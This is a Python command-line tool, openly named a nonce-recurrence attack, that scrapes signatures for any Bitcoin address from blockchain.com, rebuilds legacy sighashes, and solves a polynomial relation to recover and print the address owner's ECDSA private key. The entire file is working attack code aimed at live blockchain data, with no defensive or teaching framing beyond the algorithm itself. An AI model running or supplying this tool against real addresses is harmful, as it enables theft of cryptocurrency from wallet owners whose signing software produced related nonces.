#!/usr/bin/env python3
"""Command line tool for exploiting nonce recurrences using live blockchain data."""
import argparse
import hashlib
import io
import json
import logging
import struct
import time
from itertools import permutations
from typing import Any, Dict, Iterable, List, Optional, Sequence, Tuple

import ecdsa
import requests
import sympy as sp
from ecdsa.curves import SECP256k1
from ecdsa.ellipticcurve import CurveFp
from ecdsa.numbertheory import inverse_mod
from requests import Response
from sympy.abc import d as sym_d
from sympy.polys.domains import ZZ

try:
    from bitcoin.core import CTransaction, b2lx
except Exception:  # pragma: no cover - optional dependency
    CTransaction = None
    b2lx = None

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
LOGGER = logging.getLogger("nonce_recurrence_attack")

SIGHASH_ALL = 0x01
SIGHASH_NONE = 0x02
SIGHASH_SINGLE = 0x03
SIGHASH_OUTPUT_MASK = 0x1F
SIGHASH_ANYONECANPAY = 0x80


class TerminalColors:
    """ANSI color codes for terminal output styling."""

    HEADER = "\033[95m"
    BLUE = "\033[94m"
    CYAN = "\033[96m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"
    END = "\033[0m"


class BlockchainAPIError(RuntimeError):
    """Raised when blockchain.com responds with an error."""


class BlockchainComClient:
    """Minimal client for blockchain.com's raw endpoints."""

    def __init__(self, base_url: str = "https://blockchain.info", timeout: int = 15) -> None:
        self.base_url = base_url.rstrip("/")
        self.timeout = timeout
        self.session = requests.Session()

    def _request(
        self,
        endpoint: str,
        params: Optional[Dict[str, Any]] = None,
        expect_json: bool = True,
    ) -> Any:
        url = f"{self.base_url}{endpoint}"
        try:
            response: Response = self.session.get(url, params=params, timeout=self.timeout)
        except requests.RequestException as exc:  # pragma: no cover - network failure
            raise BlockchainAPIError(f"Request to {url} failed: {exc}") from exc
        if response.status_code >= 400:
            raise BlockchainAPIError(
                f"blockchain.com API error {response.status_code}: {response.text.strip()}"
            )
        return response.json() if expect_json else response.text.strip()

    def fetch_address_transactions(self, address: str, limit: Optional[int] = None) -> List[Dict[str, Any]]:
        collected: List[Dict[str, Any]] = []
        offset = 0
        # blockchain.com caps limit at 50 per call; paginate until we have enough
        while True:
            if limit is not None and len(collected) >= limit:
                break
            remaining = None if limit is None else limit - len(collected)
            batch_limit = 50 if remaining is None else min(50, max(remaining, 1))
            params = {"limit": batch_limit, "offset": offset}
            data = self._request(f"/rawaddr/{address}", params=params, expect_json=True)
            txs: List[Dict[str, Any]] = data.get("txs", [])
            if not txs:
                break
            collected.extend(txs)
            offset += len(txs)
            n_tx = data.get("n_tx")
            if n_tx is not None and offset >= n_tx:
                break
        return collected[:limit] if limit is not None else collected

    def fetch_transaction(self, txid: str) -> Tuple[Dict[str, Any], str]:
        json_data = self._request(f"/rawtx/{txid}", expect_json=True)
        raw_hex = self._request(f"/rawtx/{txid}", params={"format": "hex"}, expect_json=False)
        return json_data, raw_hex


def read_varint(buffer: bytes, offset: int) -> Tuple[int, int]:
    if offset >= len(buffer):
        raise ValueError("Unexpected end of transaction while reading varint")
    prefix = buffer[offset]
    offset += 1
    if prefix < 0xFD:
        return prefix, offset
    if prefix == 0xFD:
        end = offset + 2
        if end > len(buffer):
            raise ValueError("Malformed varint: truncated uint16")
        value = int.from_bytes(buffer[offset:end], "little")
        return value, offset + 2
    if prefix == 0xFE:
        end = offset + 4
        if end > len(buffer):
            raise ValueError("Malformed varint: truncated uint32")
        value = int.from_bytes(buffer[offset:end], "little")
        return value, offset + 4
    end = offset + 8
    if end > len(buffer):
        raise ValueError("Malformed varint: truncated uint64")
    value = int.from_bytes(buffer[offset:end], "little")
    return value, offset + 8


def _parse_with_python_bitcoinlib(raw_hex: str) -> Optional[Dict[str, Any]]:
    if CTransaction is None or b2lx is None:
        return None
    try:
        tx = CTransaction.stream_deserialize(io.BytesIO(bytes.fromhex(raw_hex)))
    except Exception:  # pragma: no cover - optional dependency
        return None

    vin: List[Dict[str, Any]] = []
    wit = getattr(tx, "wit", None)
    for index, txin in enumerate(tx.vin):
        witness_items: List[str] = []
        if wit and getattr(wit, "vtxinwit", None) and index < len(wit.vtxinwit):
            stack = getattr(wit.vtxinwit[index], "scriptWitness", None)
            if stack and getattr(stack, "stack", None):
                witness_items = [bytes(item).hex() for item in stack.stack]
        vin.append(
            {
                "txid": b2lx(txin.prevout.hash),
                "vout": txin.prevout.n,
                "scriptSig": {"hex": bytes(txin.scriptSig).hex()},
                "sequence": txin.nSequence,
                "txinwitness": witness_items,
            }
        )

    vout: List[Dict[str, Any]] = []
    for index, txout in enumerate(tx.vout):
        vout.append(
            {
                "n": index,
                "value_satoshi": txout.nValue,
                "scriptPubKey": {"hex": bytes(txout.scriptPubKey).hex()},
            }
        )

    has_witness = False
    if wit and getattr(wit, "vtxinwit", None):
        has_witness = any(
            getattr(item, "scriptWitness", None)
            and getattr(item.scriptWitness, "stack", None)
            and len(item.scriptWitness.stack) > 0
            for item in wit.vtxinwit
        )
    elif hasattr(tx, "is_segwit"):
        try:
            has_witness = bool(tx.is_segwit())
        except Exception:  # pragma: no cover - optional dependency
            has_witness = False

    return {
        "version": getattr(tx, "nVersion", 1),
        "locktime": getattr(tx, "nLockTime", 0),
        "vin": vin,
        "vout": vout,
        "has_witness": has_witness,
    }


def _parse_raw_transaction_manual(raw_hex: str) -> Dict[str, Any]:
    data = bytes.fromhex(raw_hex)
    cursor = 0
    total_length = len(data)

    def read_bytes(length: int) -> bytes:
        nonlocal cursor
        end = cursor + length
        if end > total_length:
            raise ValueError("Unexpected end of transaction while parsing")
        chunk = data[cursor:end]
        cursor = end
        return chunk

    version = int.from_bytes(read_bytes(4), "little")
    marker_flag = data[cursor : cursor + 2] if cursor + 2 <= total_length else b"\x00\x00"
    has_witness = marker_flag == b"\x00\x01"
    if has_witness:
        cursor += 2
    input_count, cursor = read_varint(data, cursor)
    vin: List[Dict[str, Any]] = []
    for _ in range(input_count):
        prev_txid = read_bytes(32)[::-1].hex()
        prev_vout = int.from_bytes(read_bytes(4), "little")
        script_len, cursor = read_varint(data, cursor)
        script_sig = read_bytes(script_len)
        sequence = int.from_bytes(read_bytes(4), "little")
        vin.append(
            {
                "txid": prev_txid,
                "vout": prev_vout,
                "scriptSig": {"hex": script_sig.hex()},
                "sequence": sequence,
                "txinwitness": [],
            }
        )
    output_count, cursor = read_varint(data, cursor)
    vout: List[Dict[str, Any]] = []
    for index in range(output_count):
        value_sat = int.from_bytes(read_bytes(8), "little")
        script_len, cursor = read_varint(data, cursor)
        script_pubkey = read_bytes(script_len)
        vout.append(
            {
                "n": index,
                "value_satoshi": value_sat,
                "scriptPubKey": {"hex": script_pubkey.hex()},
            }
        )
    if has_witness:
        for vin_entry in vin:
            stack_count, cursor = read_varint(data, cursor)
            witness_items: List[str] = []
            for _ in range(stack_count):
                item_len, cursor = read_varint(data, cursor)
                witness_items.append(read_bytes(item_len).hex())
            vin_entry["txinwitness"] = witness_items
    locktime = int.from_bytes(read_bytes(4), "little")
    return {
        "version": version,
        "locktime": locktime,
        "vin": vin,
        "vout": vout,
        "has_witness": has_witness,
    }


def parse_raw_transaction(raw_hex: str) -> Dict[str, Any]:
    parsed = _parse_with_python_bitcoinlib(raw_hex)
    if parsed is not None:
        return parsed
    return _parse_raw_transaction_manual(raw_hex)


def sha256d(data: bytes) -> bytes:
    return hashlib.sha256(hashlib.sha256(data).digest()).digest()


def hash160(data: bytes) -> bytes:
    return hashlib.new("ripemd160", hashlib.sha256(data).digest()).digest()


def encode_varint(value: int) -> bytes:
    if value < 0xFD:
        return value.to_bytes(1, "little")
    if value <= 0xFFFF:
        return b"\xfd" + value.to_bytes(2, "little")
    if value <= 0xFFFFFFFF:
        return b"\xfe" + value.to_bytes(4, "little")
    return b"\xff" + value.to_bytes(8, "little")


def parse_der_signature(signature: bytes) -> Tuple[int, int]:
    if len(signature) < 8 or signature[0] != 0x30:
        raise ValueError("Invalid DER signature format")
    total_length = signature[1]
    if total_length + 2 != len(signature):
        raise ValueError("Invalid DER signature length")
    r_length = signature[3]
    r_start = 4
    r_end = r_start + r_length
    r = int.from_bytes(signature[r_start:r_end], "big")
    s_length = signature[r_end + 1]
    s_start = r_end + 2
    s_end = s_start + s_length
    s = int.from_bytes(signature[s_start:s_end], "big")
    return r, s


def parse_pushdata(script_hex: str) -> List[bytes]:
    raw = bytes.fromhex(script_hex)
    elements: List[bytes] = []
    index = 0
    while index < len(raw):
        opcode = raw[index]
        index += 1
        if opcode == 0:
            elements.append(b"")
            continue
        if opcode <= 75:
            push_len = opcode
        elif opcode == 76:
            push_len = raw[index]
            index += 1
        elif opcode == 77:
            push_len = int.from_bytes(raw[index : index + 2], "little")
            index += 2
        elif opcode == 78:
            push_len = int.from_bytes(raw[index : index + 4], "little")
            index += 4
        else:
            continue
        elements.append(raw[index : index + push_len])
        index += push_len
    return elements


def decimal_satoshi(value: Any) -> int:
    if isinstance(value, int):
        return value
    from decimal import Decimal

    return int((Decimal(str(value)) * Decimal(100000000)).to_integral_value())


def legacy_sighash(tx: Dict[str, Any], input_index: int, script_bytes: bytes, sighash_type: int) -> int:
    if input_index < 0 or input_index >= len(tx.get("vin", [])):
        raise IndexError("Input index out of range for sighash computation")

    hash_flag = sighash_type & 0xFF
    base_type = hash_flag & SIGHASH_OUTPUT_MASK
    anyone_can_pay = bool(hash_flag & SIGHASH_ANYONECANPAY)

    if base_type not in {SIGHASH_ALL, SIGHASH_NONE, SIGHASH_SINGLE}:
        base_type = SIGHASH_ALL

    if base_type == SIGHASH_SINGLE and input_index >= len(tx.get("vout", [])):
        # Bitcoin Core returns 1 in this scenario; propagate the same sentinel value.
        return 1

    version = struct.pack("<I", tx.get("version", 1))

    def serialize_input(vin: Dict[str, Any], script: bytes, sequence_override: Optional[int] = None) -> bytes:
        sequence = vin.get("sequence", 0xFFFFFFFF) if sequence_override is None else sequence_override
        prev_txid = bytes.fromhex(vin["txid"])[::-1]
        prev_vout = struct.pack("<I", vin["vout"])
        return (
            prev_txid
            + prev_vout
            + encode_varint(len(script))
            + script
            + struct.pack("<I", sequence & 0xFFFFFFFF)
        )

    inputs: List[bytes] = []
    if anyone_can_pay:
        vin = tx["vin"][input_index]
        inputs.append(serialize_input(vin, script_bytes))
        serialized_inputs = encode_varint(1) + b"".join(inputs)
    else:
        for idx, vin in enumerate(tx["vin"]):
            script = script_bytes if idx == input_index else b""
            sequence = vin.get("sequence", 0xFFFFFFFF)
            if idx != input_index and base_type in (SIGHASH_NONE, SIGHASH_SINGLE):
                sequence = 0
            inputs.append(serialize_input(vin, script, sequence_override=sequence))
        serialized_inputs = encode_varint(len(inputs)) + b"".join(inputs)

    outputs: List[bytes] = []
    if base_type == SIGHASH_ALL:
        relevant_outputs = tx.get("vout", [])
        for vout in relevant_outputs:
            if "value" in vout:
                amount_sat = decimal_satoshi(vout["value"])
            else:
                amount_sat = vout.get("value_satoshi", 0)
            script = bytes.fromhex(vout["scriptPubKey"]["hex"])
            outputs.append(struct.pack("<Q", amount_sat) + encode_varint(len(script)) + script)
        serialized_outputs = encode_varint(len(outputs)) + b"".join(outputs)
    elif base_type == SIGHASH_NONE:
        serialized_outputs = encode_varint(0)
    else:  # SIGHASH_SINGLE
        for idx in range(input_index + 1):
            if idx >= len(tx.get("vout", [])):
                outputs.append(struct.pack("<Q", 0) + encode_varint(0))
                continue
            vout = tx["vout"][idx]
            if idx == input_index:
                if "value" in vout:
                    amount_sat = decimal_satoshi(vout["value"])
                else:
                    amount_sat = vout.get("value_satoshi", 0)
                script = bytes.fromhex(vout["scriptPubKey"]["hex"])
                outputs.append(struct.pack("<Q", amount_sat) + encode_varint(len(script)) + script)
            else:
                outputs.append(struct.pack("<Q", 0) + encode_varint(0))
        serialized_outputs = encode_varint(len(outputs)) + b"".join(outputs)

    locktime = struct.pack("<I", tx.get("locktime", 0))
    hash_type_bytes = struct.pack("<I", hash_flag)
    preimage = version + serialized_inputs + serialized_outputs + locktime + hash_type_bytes
    return int.from_bytes(sha256d(preimage), "big")


def extract_p2pkh_signature(script_sig_hex: str) -> Optional[Tuple[bytes, str]]:
    elements = parse_pushdata(script_sig_hex)
    if not elements:
        return None
    signature: Optional[bytes] = None
    pubkey_hex: Optional[str] = None
    for element in elements:
        if len(element) >= 70 and element[0] == 0x30:
            signature = element
        elif len(element) in (33, 65):
            pubkey_hex = element.hex()
    if signature is None or pubkey_hex is None:
        return None
    return signature, pubkey_hex


def collect_signatures_from_transaction(
    tx_json: Dict[str, Any],
    parsed_tx: Dict[str, Any],
    address: Optional[str],
) -> List[Tuple[int, ecdsa.ecdsa.Signature]]:
    results: List[Tuple[int, ecdsa.ecdsa.Signature]] = []
    inputs_json: Sequence[Dict[str, Any]] = tx_json.get("inputs", [])
    for index, vin in enumerate(parsed_tx["vin"]):
        if index >= len(inputs_json):
            break
        prev_out = inputs_json[index].get("prev_out", {})
        prev_address = prev_out.get("addr")
        script_hex = prev_out.get("script")
        if address is not None and prev_address != address:
            continue
        if not script_hex or not script_hex.startswith("76a914") or not script_hex.endswith("88ac"):
            # Only process classic P2PKH inputs to keep the hashing model manageable
            continue
        sig_info = extract_p2pkh_signature(vin.get("scriptSig", {}).get("hex", ""))
        if not sig_info:
            continue
        signature_with_type, _pubkey_hex = sig_info
        if not signature_with_type:
            continue
        sighash_type = int(signature_with_type[-1]) & 0xFF
        der_signature = signature_with_type[:-1]
        try:
            r, s = parse_der_signature(der_signature)
        except ValueError:
            continue
        script_bytes = bytes.fromhex(script_hex)
        tx_for_hash = {
            "version": parsed_tx["version"],
            "locktime": parsed_tx["locktime"],
            "vin": parsed_tx["vin"],
            "vout": parsed_tx["vout"],
        }
        try:
            z = legacy_sighash(tx_for_hash, index, script_bytes, sighash_type)
        except (IndexError, ValueError):
            continue
        if (
            z == 1
            and (sighash_type & SIGHASH_OUTPUT_MASK) == SIGHASH_SINGLE
            and index >= len(parsed_tx.get("vout", []))
        ):
            # Skip buggy SINGLE hashes that cannot be validated.
            continue
        results.append((z, ecdsa.ecdsa.Signature(r, s)))
    return results


class ECDSANonceRecurrenceAttack:
    """Attack implementation for recovering private keys from nonce recurrences."""

    def __init__(
        self,
        curve: CurveFp = SECP256k1,
        signatures_count: int = 7,
        verbose: bool = True,
    ) -> None:
        self.curve = curve
        self.order = curve.order
        self.N = signatures_count
        self.verbose = verbose
        self.colors = TerminalColors()
        if self.N < 4:
            raise ValueError("Number of signatures must be at least 4")
        self.R = sp.PolynomialRing(ZZ, symbols=[sym_d])
        self.dd = sym_d
        if self.verbose:
            self._print_attack_info()

    def _print_attack_info(self) -> None:
        from datetime import datetime

        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self._print_header("ECDSA NONCE RECURRENCE ATTACK", centered=True)
        self._print_info(f"Start time: {current_time}")
        self._print_info(f"Selected curve: {self.colors.BOLD}{self.curve.name}{self.colors.END}")
        self._print_info(f"Number of signatures (N): {self.colors.BOLD}{self.N}{self.colors.END}")
        self._print_info(
            f"Recurrence relation degree: {self.colors.BOLD}{self.N - 3}{self.colors.END}"
        )
        self._print_info(
            f"Final polynomial degree: {self.colors.BOLD}{int(self._calculate_final_polynomial_degree())}{self.colors.END}"
        )
        self._print_separator()

    def _calculate_final_polynomial_degree(self) -> int:
        return 1 + sum(range(1, self.N - 2))

    def _print_separator(self, char: str = "─") -> None:
        width = 80
        print(f"{self.colors.BLUE}{char * width}{self.colors.END}")

    def _print_header(self, text: str, centered: bool = False) -> None:
        width = 80
        if centered:
            padding = (width - len(text)) // 2
            text = " " * padding + text
        self._print_separator("═")
        print(f"{self.colors.HEADER}{self.colors.BOLD}{text}{self.colors.END}")
        self._print_separator("═")

    def _print_info(self, text: str) -> None:
        print(f"{self.colors.CYAN}[INFO]{self.colors.END} {text}")

    def _print_success(self, text: str) -> None:
        print(f"{self.colors.GREEN}[SUCCESS]{self.colors.END} {text}")

    def _print_warning(self, text: str) -> None:
        print(f"{self.colors.YELLOW}[WARNING]{self.colors.END} {text}")

    def _print_error(self, text: str) -> None:
        print(f"{self.colors.RED}[ERROR]{self.colors.END} {text}")

    def _print_progress(self, current: int, total: int, prefix: str = "Progress", length: int = 50) -> None:
        percent = float((current / total) * 100)
        filled_length = int(length * current // total)
        bar = "█" * filled_length + "░" * (length - filled_length)
        print(
            f"\r{self.colors.CYAN}{prefix}:{self.colors.END} |{self.colors.BLUE}{bar}{self.colors.END}| "
            f"{percent:.1f}% ({current}/{total})",
            end="\r",
        )
        if current == total:
            print()

    def load_signatures_from_file(self, file_path: str) -> Tuple[List[int], List[ecdsa.ecdsa.Signature]]:
        with open(file_path, "r", encoding="utf-8") as handle:
            data = json.load(handle)
        hashes = [int(item["hash"]) % self.order for item in data]
        signatures = [ecdsa.ecdsa.Signature(int(item["r"]), int(item["s"])) for item in data]
        if len(signatures) != self.N:
            raise ValueError(f"Loaded {len(signatures)} signatures, expected {self.N}")
        return hashes, signatures

    def load_signatures_from_blockchain(
        self,
        address: str,
        tx_limit: Optional[int] = None,
    ) -> Tuple[List[int], List[ecdsa.ecdsa.Signature]]:
        client = BlockchainComClient()
        transactions = client.fetch_address_transactions(address, limit=tx_limit)
        hashes: List[int] = []
        signatures: List[ecdsa.ecdsa.Signature] = []
        for tx_meta in transactions:
            txid = tx_meta.get("hash")
            if not txid:
                continue
            try:
                tx_json, raw_hex = client.fetch_transaction(txid)
            except BlockchainAPIError as exc:
                LOGGER.warning("Failed to fetch transaction %s: %s", txid, exc)
                continue
            parsed_tx = parse_raw_transaction(raw_hex)
            extracted = collect_signatures_from_transaction(tx_json, parsed_tx, address)
            for hash_int, signature in extracted:
                hashes.append(hash_int % self.order)
                signatures.append(signature)
                if len(signatures) >= self.N:
                    return hashes[: self.N], signatures[: self.N]
        raise ValueError(
            f"Collected only {len(signatures)} usable signatures from blockchain.com for {address}, "
            f"but {self.N} are required."
        )

    def k_ij_poly(
        self,
        i: int,
        j: int,
        h: List[int],
        r: List[int],
        s_inv: List[int],
    ) -> sp.Poly:
        hi = h[i] % self.order
        hj = h[j] % self.order
        s_invi = s_inv[i]
        s_invj = s_inv[j]
        ri = r[i] % self.order
        rj = r[j] % self.order
        coeff_d = (ri * s_invi - rj * s_invj) % self.order
        const_term = (hi * s_invi - hj * s_invj) % self.order
        return self.R(coeff_d * self.dd + const_term)

    def dpoly(
        self,
        n: int,
        i: int,
        j: int,
        h: List[int],
        r: List[int],
        s_inv: List[int],
    ) -> sp.Poly:
        if i == 0:
            k12 = self.k_ij_poly(j + 1, j + 2, h, r, s_inv)
            k23 = self.k_ij_poly(j + 2, j + 3, h, r, s_inv)
            k01 = self.k_ij_poly(j + 0, j + 1, h, r, s_inv)
            poly = (k12 ** 2 - k23 * k01).as_poly(sym_d)
            return poly % self.order
        left = self.dpoly(n, i - 1, j, h, r, s_inv)
        for m in range(1, i + 2):
            kij = self.k_ij_poly(j + m, j + i + 2, h, r, s_inv)
            left = (left * kij) % self.order
        right = self.dpoly(n, i - 1, j + 1, h, r, s_inv)
        for m in range(1, i + 2):
            kij = self.k_ij_poly(j, j + m, h, r, s_inv)
            right = (right * kij) % self.order
        poly = (left - right).as_poly(sym_d)
        return poly % self.order

    def attack(
        self,
        h: List[int],
        signatures: List[ecdsa.ecdsa.Signature],
        max_permutations: Optional[int] = None,
    ) -> Optional[int]:
        start_time = time.time()
        self._print_header("EXECUTING ATTACK")
        r = [sig.r for sig in signatures]
        s = [sig.s for sig in signatures]
        s_inv = [inverse_mod(sig.s, self.order) for sig in signatures]
        indices = list(range(self.N))
        all_perms = list(permutations(indices))
        if max_permutations is not None and max_permutations < len(all_perms):
            import random

            perms_to_try = random.sample(all_perms, max_permutations)
            if self.verbose:
                self._print_info(
                    f"Trying {self.colors.YELLOW}{max_permutations}{self.colors.END} random permutations out of {len(all_perms)}"
                )
        else:
            perms_to_try = all_perms
            if self.verbose:
                self._print_info(f"Trying all {self.colors.YELLOW}{len(all_perms)}{self.colors.END} permutations")
        n = self.N - 4
        for perm_idx, perm in enumerate(perms_to_try):
            if self.verbose:
                self._print_progress(perm_idx + 1, len(perms_to_try), prefix="Testing Permutations")
            h_perm = [h[i] for i in perm]
            r_perm = [r[i] for i in perm]
            s_inv_perm = [s_inv[i] for i in perm]
            try:
                poly = self.dpoly(n, n, 0, h_perm, r_perm, s_inv_perm)
                poly_mod = sp.Poly(poly, modulus=self.order)
                factors = poly_mod.factor_list()[1]
                candidate_roots: List[int] = []
                for factor, _mult in factors:
                    if factor.degree() == 1:
                        coeffs = factor.all_coeffs()
                        if not coeffs or coeffs[0] == 0:
                            continue
                        root = (-coeffs[1] * pow(int(coeffs[0]), -1, self.order)) % self.order
                        candidate_roots.append(int(root))
                for root in candidate_roots:
                    private_key = int(root) % self.order
                    if 1 <= private_key < self.order and self.verify_private_key(private_key, signatures, h):
                        elapsed_time = float(time.time() - start_time)
                        if self.verbose:
                            print()
                            self._print_success(f"Private key recovered in {elapsed_time:.2f} seconds")
                            self._print_success(f"Private key (hex): {self.colors.GREEN}{hex(private_key)}{self.colors.END}")
                            self._print_separator()
                        return private_key
            except Exception as exc:
                if self.verbose:
                    self._print_warning(f"Permutation {perm} failed: {exc}")
                continue
        if self.verbose:
            self._print_error("Attack failed: No valid private key found in the tried permutations.")
        return None

    def verify_private_key(
        self,
        private_key: int,
        signatures: List[ecdsa.ecdsa.Signature],
        h: List[int],
    ) -> bool:
        g = self.curve.generator
        try:
            pubkey_point = private_key * g
            pubkey = ecdsa.ecdsa.Public_key(g, pubkey_point)
            for i, sig in enumerate(signatures):
                if pubkey.verifies(h[i] % self.order, sig):
                    return True
        except Exception:
            return False
        return False


def main() -> None:
    parser = argparse.ArgumentParser(
        description="ECDSA polynomial nonce recurrence attack using blockchain.com raw data"
    )
    parser.add_argument(
        "--curve",
        type=str,
        default="SECP256k1",
        choices=["SECP256k1", "NIST256p", "NIST521p"],
        help="Elliptic curve (default: SECP256k1)",
    )
    parser.add_argument("--signatures-count", type=int, default=7, help="Number of signatures (N >= 4)")
    parser.add_argument(
        "--input-file",
        type=str,
        help="JSON file with signatures [{'hash': int, 'r': int, 's': int}, ...]",
    )
    parser.add_argument(
        "--address",
        type=str,
        help="Bitcoin address to scrape signatures from using blockchain.com raw endpoints",
    )
    parser.add_argument(
        "--tx-limit",
        type=int,
        help="Maximum number of transactions to fetch from blockchain.com for the supplied address",
    )
    parser.add_argument(
        "--max-permutations",
        type=int,
        help="Max permutations to try (default: all permutations)",
    )
    parser.add_argument("--verbose", action="store_true", dest="verbose", help="Enable verbose output")
    parser.add_argument(
        "--quiet",
        action="store_false",
        dest="verbose",
        help="Disable verbose output",
    )
    parser.set_defaults(verbose=True)
    args = parser.parse_args()

    curve_map = {
        "SECP256k1": ecdsa.curves.SECP256k1,
        "NIST256p": ecdsa.curves.NIST256p,
        "NIST521p": ecdsa.curves.NIST521p,
    }
    curve = curve_map.get(args.curve, ecdsa.curves.SECP256k1)

    attack = ECDSANonceRecurrenceAttack(curve=curve, signatures_count=args.signatures_count, verbose=args.verbose)

    if args.input_file:
        hashes, signatures = attack.load_signatures_from_file(args.input_file)
    elif args.address:
        hashes, signatures = attack.load_signatures_from_blockchain(args.address, args.tx_limit)
    else:
        parser.error("Must provide either --input-file or --address")
        return

    recovered = attack.attack(hashes, signatures, args.max_permutations)
    if recovered:
        LOGGER.info("Recovered private key: %s", hex(recovered))
    else:
        LOGGER.error("Recovery failed")


if __name__ == "__main__":
    main()
